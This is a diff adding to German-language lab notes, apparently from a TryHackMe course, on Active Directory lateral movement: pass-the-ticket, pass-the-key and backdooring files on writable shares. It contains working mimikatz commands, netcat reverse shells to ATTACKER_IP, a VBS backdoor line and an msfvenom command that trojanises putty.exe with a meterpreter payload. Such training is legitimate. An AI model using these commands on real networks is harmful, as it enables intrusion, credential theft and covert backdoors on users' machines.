@@ -576,4 +576,120 @@ mimikatz # sekurlsa::tickets /export
 
 **Achtung: Wenn wir nur Zugriff auf ein Ticket haben, aber nicht auf den dazugehörigen Session Key, können wir das Ticket nicht nutzen. Beide Dinge sind nötig**
 
-Mimikatz kann im Prinzip jedes TGT oder TGS welches im Speicher des LSASS Prozesses befindet extrahieren, aber meistens interessieren uns TGT´s mit denen wir Zugang zu Services erhalten, zu denen der User berechtigt ist. Gleichzeitig sind TGS´s nur für besitmmte Service gut. Zum extrahieren von TGT´s benötigen wir Admin Zugangsdaten, bei TGS´s reichen schon Low-Privilege Accounts 
+Mimikatz kann im Prinzip jedes TGT oder TGS welches im Speicher des LSASS Prozesses befindet extrahieren, aber meistens interessieren uns TGT´s mit denen wir Zugang zu Services erhalten, zu denen der User berechtigt ist. Gleichzeitig sind TGS´s nur für besitmmte Service gut. Zum extrahieren von TGT´s benötigen wir Admin Zugangsdaten, bei TGS´s reichen schon Low-Privilege Accounts.
+
+Sobald wir das gewünschte Ticket haben, können wir es in unsere aktuelle Session injezieren.
+
+>mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+
+Um Tickets in unsere eigene Session zu injezieren, benötigen wir keine Administrationsrechte. Danach steht das Ticket für jedes Tool zur Verfügung, mit dem wir Lateral Movement betreiben können. Um zu checken, ob das injezierte Ticket auch richtig funktioniert, können wir *klist* ausführen:
+
+```bash
+za\bob.jenkins@THMJMP2 C:\> klist
+
+Current LogonId is 0:0x1e43562
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ ZA.TRYHACKME.COM
+        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 4/12/2022 0:28:35 (local)
+        End Time:   4/12/2022 10:28:35 (local)
+        Renew Time: 4/23/2022 0:28:35 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: THMDC.za.tryhackme.com
+```
+
+### Overpass-the-Hash / Pass-the-Key
+
+Diese Art von Attacke ist ähnlich Pass-the-Hash, allerdings auf das Kerberos Netzwerk angewendet.
+
+Wenn ein Benutzer ein TGT anfragt, sendet dieser ja einen Zeitstempel verschlüsselt mit dem Schlüssel der sich aus seinem Passwort ergibt. Der Algorithmus der diesen Schlüssel aus dem Passwort ableitet ist entweder DES (bei aktuellen Windows Systemen standardmäßig deaktiviert), RC4, AES128 oder AES256, je nach installierter Windows Version und Kerberos Konfiguration. Wenn wir einen solchen Schlüssel besitzen, können wir bei KDC ein TGT anfragen ohne das aktuelle Passwort zu kennen. Das ist die Pass-the-Key Attacke. 
+
+Wir können die Kerberos Verschlüsselungschlüssel mit Hilfe von Mimikatz aus dem Speicher laden:
+
+```bash
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys
+```
+
+Mimikatz bietet die Möglichkeit, eine Reverse Shell (Netcat muss natürlich schon vorhanden sein) via Pass-the-Key herzustellen:
+
+**If we have the RC4 hash:**
+
+```bash 
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe 
+ATTACKER_IP 5556"
+```
+
+**If we have the AES128 hash:**
+
+```bash
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+
+**If we have the AES256 hash:**
+
+```bash
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+
+**Achtung: Wenn wir RC4 nutzen, ist der Key gleich dem NTLM Hash des Users. Das bedeutet, wenn wir den NTLM Hash extrahieren können, können wir damit auch ein TGT anfragen, solange RC4 ein aktiviertes Protokoll ist. Diese Variante wird als Overpass-the-Hash bezeichnet**
+
+Bevor wir die oberen Befehle ausführen, starten wir einen Listener auf unserer Maschine:
+
+>nc -lvnp 5556
+
+Genau wie bei Pass-the-Hash werden alle Befehle, die aus dieser Shell kommen mit den Credentials ausgeführt, die in Mimikatz injeziert wurden.
+
+Auf der neuen Shell führen wir einfach folgendes aus:
+
+>winrs.exe -r:THMIIS.za.tryhackme.com cmd
+
+#### Damit haben wir dieses Kapitel abgeschlossen
+
+
+# Abusing User Behaviour
+
+Unter gewissen Umständen kann ein Attacker Aktionen von Benutzern ausnutzen um sich weiter im Netzwerk auszudehnen. Dafür gibt es viele Möglichkeiten, wir konzentrieren uns hier aber auf die häufigsten.
+
+### Abusing Writable Shares
+
+Es ist häufig so, dass man Network Shares findet, die von Nutzern für alltägliche Aufgaben genutzt werden. Wenn diese Shares aus verschiedenen Gründen "Writeable" sind, könnte ein Attacker bestimmte Dateien platzieren und User dazu bringen, schädlichen Code auszuführen um so Zugriff auf den Rechner des Users zu bekommen.
+
+Ein bekanntes Szenario wäre, wenn wir ein Shortcut zu einem Script oder einer ausführbaren Datei in so einem Share finden.
+
+![alt text](images/image9.png)
+
+Der Grund für so einen Fund wäre bspw. dass ein Admin diese ausführbare Datei dort platziert und von den Usern im Netzwerk ausgeführt werden kann, ohne dass jeder User diese Datei auf seinem Rechner haben muss. Wenn wir auf dieser Datei Schreibrechte haben, können wir dort eine Backdoor platzieren und jeden Payload ausführen lassen, den wir möchten. 
+
+Ausserdem wird jedes Script oder Programm dass von Share aus gestartet wird auch in den %temp% Ordner des jeweiligen Benutzers kopiert. Also wird jeder Payload in diesem Kontext gestartet. 
+
+### Backdooring .vbs Scripts
+
+Als Beispiel nehmen wir ein VBS Script, dass sich in einem entsprechenden Netzwerkshare befindet. Ausserdem platzieren wir eine Kopie von nc64 in dem gleichen Ordner und platzieren folgenden Code im shared Script:
+
+```bash
+CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
+```
+
+Dieser Befehl würde nc64.exe aus dem Netzwerkshare in den %temp% Ordner des Users kopieren und eine Reverseshell zurück zum Attacker senden, wenn der User das VBS Script ausführt.
+
+
+### Backdooring .exe Files
+
+Wenn die Datei eine Windows Binary ist, bspw. Putty, können wir es Downloaden und mit MSFvenom nutzen, um eine Backdoor zu injezieren. Das Binary würde wie gewohnt funktionieren, aber jedesmal unseren Payload im Hintergrund ausführen. Um eine Backdoor in die Putty.exe zu injezieren geben wir folgendes ein:
+
+```bash
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
+```
+
+Die herauskomme PuttyX.exe würde jedesmal einen reverse_tcp meterpreter Payload ausführen, ohne das der User da merkt. 
+
+### RDP hijacking
+
+
+
